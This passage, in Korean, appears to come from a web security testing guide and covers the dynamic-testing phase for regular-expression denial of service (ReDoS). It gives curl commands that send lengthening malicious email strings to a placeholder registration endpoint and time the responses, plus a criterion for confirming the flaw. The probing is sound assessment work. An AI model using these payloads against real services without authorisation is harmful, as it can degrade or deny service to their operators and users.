### Phase 2: 동적 테스트 (검증)


**동적 테스트 방법:**
점진적으로 입력 길이를 늘려가며 응답 시간을 측정한다. 지수적으로 응답 시간이 증가하면 ReDoS 확인.

```
# 기본 테스트: 반복 문자 + 불일치 문자로 역추적 유발
# 길이를 10, 15, 20, 25로 늘려가며 응답 시간 측정

# 예: 이메일 검증 필드에 악의적 입력
curl -w "\ntime_total: %{time_total}\n" \
  -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"aaaaaaaaaaaaaaaaaaaaaaaaaaa!"}'

# 길이 증가 테스트 (20자)
curl -w "\ntime_total: %{time_total}\n" \
  -X POST "https://target.com/api/register" \
  -d '{"email":"aaaaaaaaaaaaaaaaaaaa!"}'

# 길이 증가 테스트 (25자) — 시간이 급격히 증가하면 ReDoS
curl -w "\ntime_total: %{time_total}\n" \
  -X POST "https://target.com/api/register" \
  -d '{"email":"aaaaaaaaaaaaaaaaaaaaaaaaa!"}'
```

**검증 기준:**
- **확인됨**: 동적 테스트로 입력 길이 증가에 따라 응답 시간이 지수적으로 증가하는 것을 직접 확인함 (예: 20자 → 0.1초, 25자 → 3초, 30자 → 60초+)
